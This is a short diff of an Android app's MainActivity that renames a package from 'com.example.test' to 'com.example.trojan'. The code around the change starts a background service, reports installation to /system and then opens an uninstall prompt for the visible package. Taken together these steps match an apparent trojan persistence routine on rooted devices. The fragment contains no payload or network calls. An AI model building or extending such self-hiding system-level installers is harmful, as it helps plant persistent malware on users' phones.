@@ -35,7 +35,7 @@ public class MainActivity extends Activity {
 			public void onClick(View v) {
 		    	try{
 		    		Intent i = new Intent();
-		    		i.setComponent(new ComponentName("com.example.test", "com.example.test.MyService"));
+		    		i.setComponent(new ComponentName("com.example.trojan", "com.example.trojan.MyService")); // change if changing package name
 		    		context.startService(i);
 		    		Toast.makeText(context,"started successfully!",Toast.LENGTH_SHORT).show();
 		    		}
@@ -76,7 +76,7 @@ public class MainActivity extends Activity {
 		      	  if(file.exists()){
 		      		Toast.makeText(context,"installed to /system successfully!",Toast.LENGTH_SHORT).show();
 		      	  	  
-		      	  Uri packageURI2 = Uri.parse("package:"+"com.example.test");
+		      	  Uri packageURI2 = Uri.parse("package:"+"com.example.trojan");  // change
 		      	  Intent uninstallIntent2 = new Intent(Intent.ACTION_DELETE, packageURI2);
 		      	  startActivity(uninstallIntent2); 		      	  	  
 		      	  					}
